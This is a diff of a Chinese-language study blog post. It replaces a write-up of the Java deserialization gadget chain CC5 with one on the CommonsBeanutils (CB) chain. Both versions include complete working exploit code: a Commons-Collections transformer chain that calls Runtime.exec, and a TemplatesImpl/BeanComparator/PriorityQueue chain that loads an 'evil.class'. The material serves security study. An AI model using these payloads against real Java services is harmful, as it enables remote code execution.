@@ -21,14 +21,14 @@
   
     <meta name="description" content="Learning record for myself">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Java反序列化之CC5">
-<meta property="og:url" content="http://example.com/2025/04/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC5/index.html">
+<meta property="og:title" content="Java反序列化之CB">
+<meta property="og:url" content="http://example.com/2025/04/09/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Learning record for myself">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/java_des.png">
-<meta property="article:published_time" content="2025-04-08T06:00:00.000Z">
-<meta property="article:modified_time" content="2025-04-11T08:49:52.960Z">
+<meta property="article:published_time" content="2025-04-09T06:00:00.000Z">
+<meta property="article:modified_time" content="2025-04-11T08:49:45.953Z">
 <meta property="article:author" content="Jednersaous">
 <meta property="article:tag" content="Java">
 <meta property="article:tag" content="反序列化">
@@ -37,7 +37,7 @@
   
   
   
-  <title>Java反序列化之CC5 - Hexo</title>
+  <title>Java反序列化之CB - Hexo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -192,7 +192,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Java反序列化之CC5"></span>
+            <span id="subtitle" data-typed-text="Java反序列化之CB"></span>
           
         </div>
 
@@ -203,8 +203,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-04-08 14:00" pubdate>
-          2025年4月8日 下午
+        <time datetime="2025-04-09 14:00" pubdate>
+          2025年4月9日 下午
         </time>
       </span>
     
@@ -215,7 +215,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          385 字
+          710 字
         
       </span>
     
@@ -226,7 +226,7 @@
         
         
         
-          4 分钟
+          6 分钟
         
       </span>
     
@@ -263,15 +263,39 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Java反序列化之CC5</h1>
+            <h1 id="seo-header">Java反序列化之CB</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/1vxyz/p/17473581.html">https://www.cnblogs.com/1vxyz/p/17473581.html</a><br>环境：<code>jdk8u65 &amp;&amp; Commons-collections 3.2.1</code><br>适用：需要SecurityManager关闭（默认关闭）jdk11也可利用 jdk15失败<br>实际上是CC1_LazyMap的一个变种 所以没通过恶意类加载 而是Runtime命令执行 和CC6的TiedMapEntry::hashCode()触发不同 CC5用的是TiedMapEntry::toString()</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">Gadget chain:<br>    ObjectInputStream.readObject() -&gt;<br>        BadAttributeValueExpException.readObject() -&gt;<br>            TiedMapEntry.toString() -&gt;<br>                LazyMap.get() -&gt;<br>                    ChainedTransformer.transform() -&gt;<br>                        ConstantTransformer.transform() -&gt;<br>                        InvokerTransformer.trnansform() -&gt;<br>                            Method.invoke() -&gt;<br>                                Class.getMethod() -&gt;<br>                        InvokerTransformer.transform() -&gt;<br>                            Method.invoke() -&gt;<br>                                Runtime.getRuntime() -&gt;<br>                        InvokerTransformer.transform() -&gt;<br>                            Method.invoke() -&gt;<br>                                Runtime.exec()<br></code></pre></td></tr></table></figure>
-<p><img src="/img/cc5/17440923339155.png" srcset="/img/loading.gif" lazyload><br>可以看到toString()会调用getValue() 和上面的hashCode()是一样的<br>接下来就是找哪里调用了toString() 由于有点多 所以直接上作者找到的<code>BadAttributeValueExpException</code><br><img src="/img/cc5/17440925664402.png" srcset="/img/loading.gif" lazyload><br>根据BadAttributeValueExpException::readObject()的逻辑 我们只需要实例化一个BadAttributeValueExpException实例 然后反射修改它唯一的属性val的值就可以了<br><img src="/img/cc5/17440926678718.png" srcset="/img/loading.gif" lazyload><br>因为实例化的时候就会调用toString() 所以最好还是反射修改 这样更加直观<br>payload如下</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;touch aaa&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-comment">//tiedMapEntry.toString();</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> badAttributeValueExpException.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br><br>        <span class="hljs-comment">// serialize(badAttributeValueExpException);</span><br>        unserialize(<span class="hljs-string">&quot;sercc5.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;sercc5.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+                <h1 id="CB"><a href="#CB" class="headerlink" title="CB"></a>CB</h1><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/1vxyz/p/17588722.html">https://www.cnblogs.com/1vxyz/p/17588722.html</a></p>
+<p>环境：<code>jdk8u65 &amp;&amp; commons-beanutils 1.8.3 &amp;&amp; commons-logging 1.2</code></p>
+<p>首先介绍一下CommonsBeanutils和JavaBean</p>
+<p>CommonsBeanutils 是应用于 JavaBean 的工具 它提供了对普通Java类对象（也称为JavaBean）的一些操作方法</p>
+<p>JavaBean 是一种JAVA语言写成的可重用组件 它是一个类</p>
+<p>所谓JavaBean 是指符合如下标准的Java类：</p>
+<ul>
+<li>类是公共的</li>
+<li>有一个无参的公共的构造器</li>
+<li>有私有属性 且须有对应的get,set方法去设置属性</li>
+<li>对于boolean类型的成员变量 允许使用”is”代替上面的”get”和”set”</li>
+</ul>
+<p>下面举个例子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>	<span class="hljs-keyword">private</span> String name; <span class="hljs-comment">// 属性一般定义为private</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>	&#125;<br>	<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;  <span class="hljs-comment">//读方法</span><br>		<span class="hljs-keyword">return</span> name;<br>	&#125;<br>	<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String n)</span> &#123;  <span class="hljs-comment">//写方法</span><br>		name = n;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>作为JavaBean的属性 一定是得有get和set两个方法才行的</p>
+<p>接下来我们进入CB链</p>
+<p>sink点在PropertyUtils::getProperty<br><img src="/img/CB/17441011539201.png" srcset="/img/loading.gif" lazyload><br>值得一提的是 PropertyUtils::getProperty() 还支持递归获取属性值 所以如果当一个JavaBean的getter方法存在可利用的点 那么配合这个sink点就能达成不错的效果</p>
+<p>我们先不提JavaBean后面命令执行 先讲讲PropertyUtils::getProperty()在何处被调用</p>
+<p>这里最好是找到一个能过序列化同时自己就会实例化PropertyUtils的类 那么找到的是BeanComparator<br><img src="/img/CB/17441014092097.png" srcset="/img/loading.gif" lazyload><br>因为是Comparator 我们容易联想到CC2&#x2F;CC4中的PriorityQueue</p>
+<p>PriorityQueue中包含Comparator属性 同时可序列化 通过readObject()走到compare</p>
+<p>然后我们讲讲PropertyUtils::getProperty()后面的JavaBean的getter利用</p>
+<p>这里的利用点也就是CC3中的TemplatesImpl恶意类加载 这里直接给出gadget chain<br><img src="/img/CB/17441021925947.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">Gadget chain:<br>    PriorityQueue::readObject() -&gt;<br>        ...... -&gt;<br>            BeanComparator::compare() -&gt;<br>                PropertyUtils::getProperty() -&gt;<br>                    TemplatesImpl::getOutputProperties() -&gt;<br>                        TemplatesImpl::newTransformer() -&gt;<br>                            TemplatesImpl::getTransletInstance() -&gt;<br>                                TemplatesImpl::defineTransletClasses() -&gt;<br>                                    TransletClassLoader::defineClass()<br></code></pre></td></tr></table></figure>
+<p>防止序列化时就执行命令 最好还是将恶意数据在反射的时候再进行修改</p>
+<p>得注意后面调用getter方法之前是用属性名字来索引的 所以根据TemplatesImpl的property名字是outputProperties 我们可以在BeanComparator初始化的时候就将传入PropertyUtils的property名字给换成outputProperties 但是这样的话 就只能直接修改PriorityQueue实例的size为2 就不给它add了</p>
+<p>与CC2&#x2F;4 略微不同的是 还需要用反射去修改 queue属性的值 因为要控制 BeanComparator::compare()的参数为恶意templates对象</p>
+<p>payload如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cb</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;jed&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;target/classes/evil.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, codes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>, String.CASE_INSENSITIVE_ORDER);<br>        PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, comparator);<br><br>        setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<span class="hljs-comment">// 设置BeanComparator.compare()的参数</span><br>        setFieldValue(queue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">// serialize(queue);</span><br>        unserialize(<span class="hljs-string">&quot;CB1.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object object,String field_name,Object filed_value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        Class clazz=object.getClass();<br>        Field declaredField=clazz.getDeclaredField(field_name);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(object,filed_value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;CB1.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
                 
               </div>
             
@@ -297,8 +321,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Java反序列化之CC5</div>
-      <div>http://example.com/2025/04/08/Java反序列化之CC5/</div>
+      <div>Java反序列化之CB</div>
+      <div>http://example.com/2025/04/09/Java反序列化之CB/</div>
     </div>
     <div class="license-meta">
       
@@ -310,7 +334,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年4月8日</div>
+          <div>2025年4月9日</div>
         </div>
       
       
@@ -342,9 +366,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/04/09/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB/" title="Java反序列化之CB">
+                      <a href="/2025/04/11/Shiro550%E5%89%96%E6%9E%90/" title="Shiro550剖析">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Java反序列化之CB</span>
+                        <span class="hidden-mobile">Shiro550剖析</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -352,8 +376,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/04/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC2/" title="Java反序列化之CC2">
-                        <span class="hidden-mobile">Java反序列化之CC2</span>
+                      <a href="/2025/04/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC5/" title="Java反序列化之CC5">
+                        <span class="hidden-mobile">Java反序列化之CC5</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
